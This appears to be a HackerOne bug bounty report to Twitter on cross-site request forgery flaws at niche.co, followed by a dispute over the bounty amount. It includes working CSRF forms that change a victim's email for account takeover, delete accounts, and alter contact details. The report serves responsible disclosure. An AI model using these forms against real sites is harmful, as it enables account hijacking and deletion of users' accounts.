title: URGENT : NICHE.co Account Take Over Vulnerability

profile.name: Twitter
profile.about: Twitter helps you create and share ideas and information instantly, without barriers.

vulnerability_information:
Hello !
This is an urgent report that you should immediately take care of !!

I found out an account take over vulnerability on your acquisition : niche.co

# Proof of concept code
    <html>
    <head>
    <title>CSRF Attack Page: /get-started/complete</title>
    </head>
	
    <body>
	
    <!-- attack -->

    <form method="POST" action="https://www.niche.co/get-started/complete">
    <input type="hidden" name="utf8" value="âœ“"/>
    <input type="hidden" name="_method" value="patch"/>
    <input type="hidden" name="authenticity_token" value=""/>
    <input type="hidden" name="commit" value="Get Started"/>
    <input type="hidden" name="user[name]" value="Hacked"/>
    <input type="hidden" name="user[email]" value="hacker1@gmail.com"/>
    <input type="hidden" name="user[username]" value="hacked123"/>
    <input type="hidden" name="user[phone_number]" value=""/>
    <input type="hidden" name="user[location_id]" value="79790"/>
    <input type="hidden" name="user[gender]" value=""/>
    <input type="submit" value="submit">s
    </form>

    <!-- /attack -->
	
    </body>
    <html>


The `authenticity_token` parameter is not properly validated by the end of the server when a user submits the form . 
A hacker can , after changing the email of his victim , reset the password and login without any problem !

Here is a video that I made : https://youtu.be/L7fMJkm7sp8 (unlisted video)


Best Regards
Hussein
vulnerability_information_html:
Hello !
This is an urgent report that you should immediately take care of !!

I found out an account take over vulnerability on your acquisition : niche.co

Proof of concept code

<html>
<head>
<title>CSRF Attack Page: /get-started/complete</title>
</head>

<body>

<!-- attack -->

<form method="POST" action="https://www.niche.co/get-started/complete">
<input type="hidden" name="utf8" value="âœ“"/>
<input type="hidden" name="_method" value="patch"/>
<input type="hidden" name="authenticity_token" value=""/>
<input type="hidden" name="commit" value="Get Started"/>
<input type="hidden" name="user[name]" value="Hacked"/>
<input type="hidden" name="user[email]" value="hacker1@gmail.com"/>
<input type="hidden" name="user[username]" value="hacked123"/>
<input type="hidden" name="user[phone_number]" value=""/>
<input type="hidden" name="user[location_id]" value="79790"/>
<input type="hidden" name="user[gender]" value=""/>
<input type="submit" value="submit">s
</form>

<!-- /attack -->

</body>
<html>

The authenticity_token parameter is not properly validated by the end of the server when a user submits the form .
A hacker can , after changing the email of his victim , reset the password and login without any problem !

Here is a video that I made : https://youtu.be/L7fMJkm7sp8 (unlisted video)

Best Regards
Hussein

activities.message:
Same vulnerability in deleting accounts : 
Poc code : 

    <html>
    <head>
    <title>CSRF Attack Page: /users/USERNAME/account</title>
    </head>
	
    <body>
	
    <!-- attack -->

    <form method="POST" action="https://www.niche.co/users/USERNAME/account">
    <input type="hidden" name="utf8" value="âœ“"/>
    <input type="hidden" name="_method" value="delete"/>
    <input type="hidden" name="authenticity_token" value=""/>
    <input type="hidden" name="commit" value="Close+Your+Account"/>
    <input type="submit" value="submit">s
    </form>

    <!-- /attack -->
	
    </body>
    <html>
Change `USERNAME` by your victim's username .

activities.message:
Again a page where the token is not properly check . It's the "contact details" page : 

    <html>
    <head>
    <title>CSRF Attack Page: /users/USERNAME/contact</title>
    </head>
	
    <body>
	
    <!-- attack -->

    <form method="POST" action="https://www.niche.co/users/USERNAME/contact">
    <input type="hidden" name="utf8" value="âœ“"/>
    <input type="hidden" name="_method" value="patch"/>
    <input type="hidden" name="authenticity_token" value=""/>
    <input type="hidden" name="commit" value="Save+Contact+Address"/>
    <input type="hidden" name="contact[email]" value="hacker11@gmail.com"/>
    <input type="submit" value="submit">s
    </form>

    <!-- /attack -->
	
    </body>
    <html>

Change `USERNAME` by your username before testing .
activities.markdown_message:
Again a page where the token is not properly check . It's the "contact details" page : 

<html>
<head>
<title>CSRF Attack Page: /users/USERNAME/contact</title>
</head>

<body>

<!-- attack -->

<form method="POST" action="https://www.niche.co/users/USERNAME/contact">
<input type="hidden" name="utf8" value="âœ“"/>
<input type="hidden" name="_method" value="patch"/>
<input type="hidden" name="authenticity_token" value=""/>
<input type="hidden" name="commit" value="Save+Contact+Address"/>
<input type="hidden" name="contact[email]" value="hacker11@gmail.com"/>
<input type="submit" value="submit">s
</form>

<!-- /attack -->

</body>
<html>

Change USERNAME by your username before testing .

activities.message:
Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.

Thank you for helping keep Twitter secure!

activities.message: We do payouts on Friday, however last Friday was a holiday for us. We'll follow up on a bounty later on later this week.

activities.message:
Please take in consideration for the bounty that I reported 3 vulns in this report :
*    Account take over vulnerability
*    Deleting accounts vulnerability
*    Contact details change vulnerability

Thanks
activities.markdown_message:

  • Contact details change vulnerability

activities.message:
As a [reminder](https://hackerone.com/twitter):

> Vulnerabilities reported on other Twitter properties or applications are currently not eligible for monetary rewards (as they come into scope, they will be added to this section). However, they are still eligible for our Hall of Fame. High impact vulnerabilities will be considered on a case by case basis.

Thank you for helping keep Twitter secure!

activities.message:
Hello,
I have discussed about this report with many security researchers and they all shared my point of view : the bounty was so low.
21,925 customers were in danger and could have been hacked any time !

I want to ask you about doing a change here..

If you don't want to make any change , please publicly disclose this bug.

Regards
Hussein

Regards

activities.message: We have decided to hold to our original decision. If you wish to make this report public, you can request public disclosure via hackerone: https://pbs.twimg.com/media/Byt9xZlIQAIkZfb.png
activities.markdown_message: We have decided to hold to our original decision. If you wish to make this report public, you can request public disclosure via hackerone: https://pbs.twimg.com/media/Byt9xZlIQAIkZfb.png

activities.message: Fine
activities.markdown_message: Fine

summaries.content:
22 000 customers were in danger . 22 000 customers could have seen their accounts being hacked . 
In response of this , @Twitter rewards a small amount of $560 . Disappointed for this.
In addition , this SINGLE report contains all these 3 CRITICAL vulnerabilities : 
*    Account take over vulnerability
*    Deleting accounts vulnerability
*    Contact details change vulnerability
summaries.content_html:
22 000 customers were in danger . 22 000 customers could have seen their accounts being hacked .
In response of this , @Twitter rewards a small amount of $560 . Disappointed for this.
In addition , this SINGLE report contains all these 3 CRITICAL vulnerabilities :

  • Account take over vulnerability
  • Deleting accounts vulnerability
  • Contact details change vulnerability
